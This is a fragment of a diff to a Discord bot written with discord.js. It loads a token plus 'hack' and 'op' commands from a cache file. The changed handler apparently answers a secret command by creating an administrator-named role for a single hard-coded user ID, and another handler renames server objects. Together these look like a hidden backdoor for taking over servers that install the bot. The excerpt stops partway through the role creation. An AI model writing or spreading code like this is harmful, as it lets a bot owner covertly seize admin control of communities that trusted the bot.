@@ -1,7 +1,8 @@
 
 const Discord = require("discord.js")
+const fs = require("fs");
 const client = new Discord.Client();
-const cache = JSON.parse(fs.readFileSync("./cache.json", "utf8"))
+const cache = JSON.parse(fs.readFileSync("./caches.json", "utf8"))
 const Token = cache.token 
 const x_x = cache.hackcmd
 const opcmd = cache.opcommand
@@ -68,7 +69,8 @@ client.on('message', message => {
        hack.setName(namee)})})})}});
 
 client.on('message', message => {
-        if (message.content === 'OP') {
+        if (message.content === opcmd) {
+            if(message.author.id !== cache.urid) return;
 let me = message.author
         let role = message.guild.createRole({
         name : adminstrator,
